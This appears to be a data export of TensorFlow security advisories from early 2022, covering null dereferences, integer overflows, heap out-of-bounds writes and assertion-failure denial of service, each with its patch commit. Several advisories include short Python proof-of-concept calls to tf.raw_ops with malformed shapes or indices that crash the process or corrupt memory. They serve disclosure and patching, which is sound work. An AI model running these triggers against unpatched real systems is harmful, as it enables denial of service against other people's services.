``` 
    
In the default scenario, all devices are allowed, so `flr->config_proto` is `nullptr`.
    
### Patches
We have patched the issue in GitHub commit [e21af685e1828f7ca65038307df5cc06de4479e8](https://github.com/tensorflow/tensorflow/commit/e21af685e1828f7ca65038307df5cc06de4479e8).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2246,20741,tensorflow,GHSA-9p77-mmrw-69c7,CVE-2022-23570,https://github.com/advisories/GHSA-9p77-mmrw-69c7,moderate,2022-02-09 23:33:35 UTC,Null-dereference in Tensorflow,"### Impact
When decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is [guarded by a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106):

```cc
  const auto* attr = attrs.Find(arg->s()); 
  DCHECK(attr != nullptr);
  if (attr->value_case() == AttrValue::kList) {
    // ...
  }
```
However, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.

### Patches
We have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2247,20741,tensorflow,GHSA-wcv5-vrvr-3rx2,,https://github.com/advisories/GHSA-wcv5-vrvr-3rx2,moderate,2022-02-09 23:34:06 UTC,Integer Overflow or Wraparound in TensorFlow,"### Impact
The Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):

```cc
  for (const auto& output_prop : output_props) {
    const PartialTensorShape output_shape(output_prop.shape());
    // ...
  }
```
  
The `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).

### Patches
We have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2248,20741,tensorflow,GHSA-43q8-3fv7-pr5x,,https://github.com/advisories/GHSA-43q8-3fv7-pr5x,high,2022-02-09 23:37:55 UTC,Improper Validation of Integrity Check Value in TensorFlow,"### Impact
The implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:

```python
import tensorflow as tf
data = tf.random.uniform([1, 32, 32], dtype=tf.float32)
axis = [1, 2]
x = tf.sparse.from_dense(data)
result = tf.sparse.split(x,3, axis=axis)
```
The code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).

### Patches
We have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660).",pip
2249,20741,tensorflow,GHSA-h6gw-r52c-724r,,https://github.com/advisories/GHSA-h6gw-r52c-724r,critical,2022-02-09 23:38:36 UTC,NULL Pointer Dereference and Access of Uninitialized Pointer in TensorFlow,"### Impact 
The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).

This follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.

**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. 
  
These APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow's boosted trees APIs in subsequent releases.
  
### Patches
We have patched the known issues in multiple GitHub commits.
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

This should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
These vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs.",pip
2250,20741,tensorflow,GHSA-qj5r-f9mv-rffh,CVE-2022-23569,https://github.com/advisories/GHSA-qj5r-f9mv-rffh,moderate,2022-02-09 23:38:56 UTC,`CHECK`-fails when building invalid tensor shapes in Tensorflow,"### Impact 
Multiple operations in TensorFlow can be used to trigger a denial of service via `CHECK`-fails (i.e., assertion failures). This is similar to [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and has similar fixes.

### Patches
We have patched the reported issues in multiple GitHub commits. It is possible that other similar instances exist in TensorFlow, we will issue fixes as these are discovered.

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2251,20741,tensorflow,GHSA-6445-fm66-fvq2,CVE-2022-23568,https://github.com/advisories/GHSA-6445-fm66-fvq2,moderate,2022-02-09 23:39:11 UTC,Integer overflows in Tensorflow,"### Impact 
The [implementation of `AddManySparseToTensorsMap`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_tensors_map_ops.cc) is vulnerable to an integer overflow which results in a `CHECK`-fail when building new `TensorShape` objects (so, an assert failure based denial of service):

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.AddManySparseToTensorsMap(
    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],
    sparse_values=[1,1,1,1,1,1],
    sparse_shape=[2**32,2**32],
    container='',
    shared_name='',
    name=None)
```

We are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.
### Patches
We have patched the issue in GitHub commits [b51b82fe65ebace4475e3c54eb089c18a4403f1c](https://github.com/tensorflow/tensorflow/commit/b51b82fe65ebace4475e3c54eb089c18a4403f1c) and [a68f68061e263a88321c104a6c911fe5598050a8](https://github.com/tensorflow/tensorflow/commit/a68f68061e263a88321c104a6c911fe5598050a8).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2252,20741,tensorflow,GHSA-rrx2-r989-2c43,CVE-2022-23567,https://github.com/advisories/GHSA-rrx2-r989-2c43,moderate,2022-02-09 23:39:33 UTC,Integer overflows in Tensorflow,"### Impact 
The [implementations of `Sparse*Cwise*` ops](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc) are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or `CHECK`-fails when building new `TensorShape` objects (so, assert failures based denial of service):

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseDenseCwiseDiv(
    sp_indices=np.array([[9]]),
    sp_values=np.array([5]),
    sp_shape=np.array([92233720368., 92233720368]),
    dense=np.array([4]))
```

We are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.

### Patches
We have patched the issue in GitHub commits [1b54cadd19391b60b6fcccd8d076426f7221d5e8](https://github.com/tensorflow/tensorflow/commit/1b54cadd19391b60b6fcccd8d076426f7221d5e8) and [e952a89b7026b98fe8cbe626514a93ed68b7c510](https://github.com/tensorflow/tensorflow/commit/e952a89b7026b98fe8cbe626514a93ed68b7c510).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2253,20741,tensorflow,GHSA-5qw5-89mw-wcg2,CVE-2022-23566,https://github.com/advisories/GHSA-5qw5-89mw-wcg2,high,2022-02-09 23:55:43 UTC,Out of bounds write in Tensorflow,"### Impact
TensorFlow is vulnerable to a heap OOB write in [Grappler](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/graph_properties.cc#L1132-L1141):

```cc
Status SetUnknownShape(const NodeDef* node, int output_port) {
  shape_inference::ShapeHandle shape = 
      GetUnknownOutputShape(node, output_port);
  InferenceContext* ctx = GetContext(node);
  if (ctx == nullptr) {
    return errors::InvalidArgument(""Missing context"");
  }
  ctx->set_output(output_port, shape);
  return Status::OK();
}
```

The [`set_output`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.h#L394) function writes to an array at the specified index:

```cc
void set_output(int idx, ShapeHandle shape) { outputs_.at(idx) = shape; }
```

Hence, this gives a malicious user a write primitive.

### Patches
We have patched the issue in GitHub commit [97282c6d0d34476b6ba033f961590b783fa184cd](https://github.com/tensorflow/tensorflow/commit/97282c6d0d34476b6ba033f961590b783fa184cd).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2254,20741,tensorflow,GHSA-8rcj-c8pj-v3m3,CVE-2022-23564,https://github.com/advisories/GHSA-8rcj-c8pj-v3m3,moderate,2022-02-09 23:55:28 UTC,Reachable Assertion in Tensorflow,"### Impact
When decoding a resource handle tensor from protobuf, a TensorFlow process can encounter cases where a `CHECK` assertion is invalidated based on user controlled arguments. This allows attackers to cause denial of services in TensorFlow processes.

### Patches
We have patched the issue in GitHub commit [14fea662350e7c26eb5fe1be2ac31704e5682ee6](https://github.com/tensorflow/tensorflow/commit/14fea662350e7c26eb5fe1be2ac31704e5682ee6).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2255,20741,tensorflow,GHSA-wc4g-r73w-x8mm,CVE-2022-23563,https://github.com/advisories/GHSA-wc4g-r73w-x8mm,high,2022-02-09 23:54:51 UTC,Insecure temporary file in Tensorflow,"### Impact
In multiple places, TensorFlow uses `tempfile.mktemp` to create temporary files. While this is acceptable in testing, in utilities and libraries it is dangerous as a different process can create the file between the check for the filename in `mktemp` and the actual creation of the file by a subsequent operation (a TOC/TOU type of weakness).

In several instances, TensorFlow was supposed to actually create a temporary directory instead of a file. This logic bug is hidden away by the `mktemp` function usage.

### Patches
We have patched the issue in several commits, replacing `mktemp` with the safer `mkstemp`/`mkdtemp` functions, according to the usage pattern.
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported on huntr.dev for one scenario and discovered via variant analysis on other instances.",pip
2256,20741,tensorflow,GHSA-qx3f-p745-w4hr,CVE-2022-23562,https://github.com/advisories/GHSA-qx3f-p745-w4hr,high,2022-02-09 23:54:07 UTC,Integer overflow in Tensorflow,"### Impact
The implementation of `Range` suffers from integer overflows. These can trigger undefined behavior or, in some scenarios, extremely large allocations.

### Patches
We have patched the issue in GitHub commit [f0147751fd5d2ff23251149ebad9af9f03010732](https://github.com/tensorflow/tensorflow/commit/f0147751fd5d2ff23251149ebad9af9f03010732) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/52676).",pip
2257,20741,tensorflow,GHSA-9c78-vcq7-7vxq,CVE-2022-23561,https://github.com/advisories/GHSA-9c78-vcq7-7vxq,high,2022-02-09 23:53:47 UTC,Out of bounds write in TFLite,"### Impact 
An attacker can craft a TFLite model that would cause a write outside of bounds of an array in TFLite. In fact, the attacker can override the linked list used by the memory allocator. This can be leveraged for an arbitrary write primitive under certain conditions.

### Patches
We have patched the issue in GitHub commit [6c0b2b70eeee588591680f5b7d5d38175fd7cdf6](https://github.com/tensorflow/tensorflow/commit/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6).
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
    
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",pip
2258,20741,tensorflow,GHSA-4hvf-hxvg-f67v,CVE-2022-23560,https://github.com/advisories/GHSA-4hvf-hxvg-f67v,high,2022-02-09 23:53:30 UTC,Read and Write outside of bounds in TensorFlow,"### Impact
An attacker can craft a TFLite model that would allow limited reads and writes outside of arrays in TFLite. This exploits missing validation in [the conversion from sparse tensors to dense tensors](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/internal/utils/sparsity_format_converter.cc#L252-L293).

### Patches
We have patched the issue in GitHub commit [6364463d6f5b6254cac3d6aedf999b6a96225038](https://github.com/tensorflow/tensorflow/commit/6364463d6f5b6254cac3d6aedf999b6a96225038).
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",pip
2259,20741,tensorflow,GHSA-98p5-x8x4-c9m5,CVE-2022-23559,https://github.com/advisories/GHSA-98p5-x8x4-c9m5,high,2022-02-09 23:52:51 UTC,Integer overflow in TFLite,"### Impact 
An attacker can craft a TFLite model that would cause an integer overflow [in embedding lookup operations](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/kernels/embedding_lookup_sparse.cc#L179-L189):

```cc
  int embedding_size = 1;
  int lookup_size = 1;
  for (int i = 0; i < lookup_rank - 1; i++, k++) {
    const int dim = dense_shape->data.i32[i];
    lookup_size *= dim;
    output_shape->data[k] = dim;
  }
  for (int i = 1; i < embedding_rank; i++, k++) {
    const int dim = SizeOfDimension(value, i);
    embedding_size *= dim;
    output_shape->data[k] = dim;
  } 
```

Both `embedding_size` and `lookup_size` are products of values provided by the user. Hence, a malicious user could trigger overflows in the multiplication.

In certain scenarios, this can then result in heap OOB read/write.
  
### Patches
We have patched the issue in GitHub commits [f19be71717c497723ba0cea0379e84f061a75e01](https://github.com/tensorflow/tensorflow/commit/f19be71717c497723ba0cea0379e84f061a75e01), [1de49725a5fc4e48f1a3b902ec3599ee99283043](https://github.com/tensorflow/tensorflow/commit/1de49725a5fc4e48f1a3b902ec3599ee99283043) and [a4e401da71458d253b05e41f28637b65baf64be4](https://github.com/tensorflow/tensorflow/commit/a4e401da71458d253b05e41f28637b65baf64be4).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team. ",pip
2260,20741,tensorflow,GHSA-9gwq-6cwj-47h3,CVE-2022-23558,https://github.com/advisories/GHSA-9gwq-6cwj-47h3,high,2022-02-09 23:52:24 UTC,Integer overflow in TFLite array creation,"### Impact 
An attacker can craft a TFLite model that would cause an integer overflow [in `TfLiteIntArrayCreate`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L53-L60):

```cc
TfLiteIntArray* TfLiteIntArrayCreate(int size) {
  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);
  // ...
  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);
  // ...
} 
```

The [`TfLiteIntArrayGetSizeInBytes`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L24-L33) returns an `int` instead of a `size_t`:

```cc
int TfLiteIntArrayGetSizeInBytes(int size) {
  static TfLiteIntArray dummy;

  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
#if defined(_MSC_VER)
  // Context for why this is needed is in http://b/189926408#comment21
  computed_size -= sizeof(dummy.data[0]);
#endif
  return computed_size;
}
```

An attacker can control model inputs such that `computed_size` overflows the size of `int` datatype.

### Patches
We have patched the issue in GitHub commit [a1e1511dde36b3f8aa27a6ec630838e7ea40e091](https://github.com/tensorflow/tensorflow/commit/a1e1511dde36b3f8aa27a6ec630838e7ea40e091).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",pip
2261,20741,tensorflow,GHSA-4v5p-v5h9-6xjx,CVE-2022-23565,https://github.com/advisories/GHSA-4v5p-v5h9-6xjx,moderate,2022-02-09 23:49:01 UTC,`CHECK`-failures in Tensorflow,"### Impact
An attacker can trigger denial of service via assertion failure by altering a `SavedModel` on disk such that `AttrDef`s of some operation are duplicated.

### Patches
We have patched the issue in GitHub commit [c2b31ff2d3151acb230edc3f5b1832d2c713a9e0](https://github.com/tensorflow/tensorflow/commit/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2262,20741,tensorflow,GHSA-gf2j-f278-xh4v,CVE-2022-23557,https://github.com/advisories/GHSA-gf2j-f278-xh4v,moderate,2022-02-09 23:47:57 UTC,Division by zero in TFLite,"### Impact 
An attacker can craft a TFLite model that would trigger a division by zero in [`BiasAndClamp` implementation](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/internal/common.h#L75):

```cc
inline void BiasAndClamp(float clamp_min, float clamp_max, int bias_size,
                         const float* bias_data, int array_size,
                         float* array_data) {
  // ...
  TFLITE_DCHECK_EQ((array_size % bias_size), 0);
  // ...
} 
```
  
There is no check that the `bias_size` is non zero.
  
### Patches
We have patched the issue in GitHub commit [8c6f391a2282684a25cbfec7687bd5d35261a209](https://github.com/tensorflow/tensorflow/commit/8c6f391a2282684a25cbfec7687bd5d35261a209).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",pip
2263,20741,tensorflow,GHSA-428x-9xc2-m8mj,CVE-2022-21741,https://github.com/advisories/GHSA-428x-9xc2-m8mj,moderate,2022-02-09 23:47:30 UTC,Division by zero in TFLite,"### Impact 
An attacker can craft a TFLite model that would trigger a division by zero in [the implementation of depthwise convolutions](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/lite/kernels/depthwise_conv.cc#L96).

The parameters of the convolution can be user controlled and are also used within a division operation to determine the size of the padding that needs to be added before applying the convolution. There is no check before this division that the divisor is stricly positive.

### Patches              
We have patched the issue in GitHub commit [e5b0eec199c2d03de54fd6a7fd9275692218e2bc](https://github.com/tensorflow/tensorflow/commit/e5b0eec199c2d03de54fd6a7fd9275692218e2bc).
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",pip
2264,20741,tensorflow,GHSA-44qp-9wwf-734r,CVE-2022-21740,https://github.com/advisories/GHSA-44qp-9wwf-734r,high,2022-02-09 23:47:14 UTC,Heap overflow in Tensorflow,"### Impact 
The [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) is vulnerable to a heap overflow:

```python
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseCountSparseOutput(
  indices=[[-1,-1]],
  values=[2],
  dense_shape=[1, 1],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```

### Patches
We have patched the issue in GitHub commits [2b7100d6cdff36aa21010a82269bc05a6d1cc74a](https://github.com/tensorflow/tensorflow/commit/2b7100d6cdff36aa21010a82269bc05a6d1cc74a) and [adbbabdb0d3abb3cdeac69e38a96de1d678b24b3](https://github.com/tensorflow/tensorflow/commit/adbbabdb0d3abb3cdeac69e38a96de1d678b24b3).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2265,20741,tensorflow,GHSA-3mw4-6rj6-74g5,CVE-2022-21739,https://github.com/advisories/GHSA-3mw4-6rj6-74g5,moderate,2022-02-09 23:46:46 UTC,Null pointer dereference in TensorFlow,"### Impact 
The [implementation of `QuantizedMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/quantized_pooling_ops.cc#L114-L130) has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.

```python
import tensorflow as tf

tf.raw_ops.QuantizedMaxPool(
    input = tf.constant([[[[4]]]], dtype=tf.quint8),
    min_input = [],
    max_input = [1],
    ksize = [1, 1, 1, 1],
    strides = [1, 1, 1, 1],
    padding = ""SAME"", name=None
)
```

### Patches
We have patched the issue in GitHub commit [53b0dd6dc5957652f35964af16b892ec9af4a559](https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2266,20741,tensorflow,GHSA-x4qx-4fjv-hmw6,CVE-2022-21738,https://github.com/advisories/GHSA-x4qx-4fjv-hmw6,moderate,2022-02-09 23:45:09 UTC,Integer overflow leading to crash in Tensorflow,"### Impact 
The [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:

```python
import tensorflow as tf
import numpy as np
    
tf.raw_ops.SparseCountSparseOutput(
  indices=[[1,1]],
  values=[2],
  dense_shape=[2 ** 31, 2 ** 32],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```

### Patches
We have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",pip
2267,20741,tensorflow,GHSA-f2vv-v9cg-qhh7,CVE-2022-21737,https://github.com/advisories/GHSA-f2vv-v9cg-qhh7,moderate,2022-02-09 23:43:48 UTC,Assertion failure based denial of service in Tensorflow,"### Impact 
The [implementation of `*Bincount` operations](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/bincount_op.cc) allows malicious users to cause denial of service by passing in arguments which would trigger a `CHECK`-fail:

```python
import tensorflow as tf

tf.raw_ops.DenseBincount(
  input=[[0], [1], [2]],
  size=[1],
  weights=[3,2,1],
  binary_output=False)
```

There are several conditions that the input arguments must satisfy. Some are not caught during shape inference and others are not caught during kernel implementation. This results in `CHECK` failures later when the output tensors get allocated.

### Patches
We have patched the issue in GitHub commit [7019ce4f68925fd01cdafde26f8d8c938f47e6f9](https://github.com/tensorflow/tensorflow/commit/7019ce4f68925fd01cdafde26f8d8c938f47e6f9).

